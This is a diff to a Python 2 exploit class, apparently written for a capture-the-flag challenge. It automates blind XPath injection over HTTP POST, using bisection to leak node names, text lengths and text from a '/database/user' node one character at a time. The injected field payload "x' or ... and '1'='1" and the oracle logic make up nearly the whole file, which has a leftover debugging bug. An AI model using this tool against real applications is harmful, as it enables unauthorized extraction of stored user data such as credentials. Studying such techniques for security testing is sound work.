@@ -33,6 +33,8 @@ class ChallengeLeaker(HTTPLeaker):
         NODE_NAME_LENGTH  = 0
         NODE_NAME         = 1
         NODE_CHILD_NUMBER = 2
+        NODE_TEXT_LENGTH  = 3
+        NODE_TEXT         = 4
 
     def __init__(self):
         super(ChallengeLeaker, self).__init__(
@@ -42,20 +44,26 @@ class ChallengeLeaker(HTTPLeaker):
         self.bisect = BaseDicotomia(N=8)
 
         self.state.update({
-            'state': self.State.NODE_NAME_LENGTH,
-            'xpath': '/*[1]',
+            'state': self.State.NODE_TEXT_LENGTH, # here we want _LENGTH
+            'xpath': '/database/user[2]/*[3]',
             'nodes': [],
         })
 
+        self.payloads = {
+            self.State.NODE_NAME_LENGTH: None,
+        }
+
     def update(self):
         # here we control the state, when a bisection is finished we pass to the next
-        print self._leak
         guess = self._leak['success'] is not None
         self.bisect.submit_oracle(guess)
 
         if self.bisect.has_finished():
             self.logger.debug('state: %s' % self.state)
-            if self.state['state'] == self.State.NODE_NAME_LENGTH:
+
+            state = self.state['state']
+
+            if state == self.State.NODE_NAME_LENGTH:
                 self.state['state'] = self.State.NODE_NAME
                 # we finished the deduce the node name length
                 self.state['n'] = int(self.bisect.guess)
@@ -68,8 +76,8 @@ class ChallengeLeaker(HTTPLeaker):
                 self.state['node_name'] = ''
                 #raise
 
-            elif self.state['state'] == self.State.NODE_NAME:
-                import ipdb;ipdb.set_trace()
+            elif state == self.State.NODE_NAME:
+                #import ipdb;ipdb.set_trace()
                 if self.state['idx'] <= self.state['n']: # we are deducing the tag name but we haven't finished yet
                     self.state['node_name'] += self.bisect.guess
                     self.state['idx'] += 1
@@ -78,15 +86,45 @@ class ChallengeLeaker(HTTPLeaker):
                     self.logger.info('node name: \'%s\'' % self.state['node_name'])
                     raise
 
+            elif state == self.State.NODE_TEXT_LENGTH:
+                # we change the next state
+                self.state['state'] = self.State.NODE_TEXT
+                # we finished the deduce the node name length
+                self.state['n'] = int(self.bisect.guess)
+
+                self.logger.info('node %s has text with length %d' % (self.state['xpath'], self.state['n']))
+
+                self.bisect = BaseDicotomia(alphabet=string.letters+string.digits)
+
+                self.state['idx'] = 1  # xpath is 1-indexed
+                self.state['text'] = '' #CHANGE HERE
+                # raise
+
+            elif state == self.State.NODE_TEXT:
+                # import ipdb;ipdb.set_trace()
+                if self.state['idx'] <= self.state['n']:  # we are deducing the tag name but we haven't finished yet
+                    self.state['text'] += self.bisect.guess # CHANGE HERE
+                    self.state['idx'] += 1
+                    self.bisect = BaseDicotomia(alphabet=string.letters+string.digits)
+                else:  # we have finished
+                    self.logger.info('node name: \'%s\'' % self.state['node_name'])
+                    raise
 
     def get_requests_method(self):
         return 'POST'
 
     def get_payload(self):
-        if self.state['state'] == self.State.NODE_NAME_LENGTH:
+
+        state = self.state['state']
+
+        if state == self.State.NODE_NAME_LENGTH:
             return 'string-length(name(%s))>=%s' % (self.state['xpath'], self.bisect.guess)
-        elif self.state['state'] == self.State.NODE_NAME:
+        elif state == self.State.NODE_NAME:
             return "contains('%s',substring(name(%s),%d,1))" % (self.bisect.guess, self.state['xpath'], self.state['idx'])
+        elif state == self.State.NODE_TEXT_LENGTH:
+            return "string-length(%s[text()])>=%s" % (self.state['xpath'], self.bisect.guess)
+        elif state == self.State.NODE_TEXT:
+            return "contains('%s',substring(%s[text()],%d,1))" % (self.bisect.guess, self.state['xpath'], self.state['idx'])
 
     def get_request_vulnerabile_field_value(self):
         return "x' or %s and '1'='1" % self.get_payload()
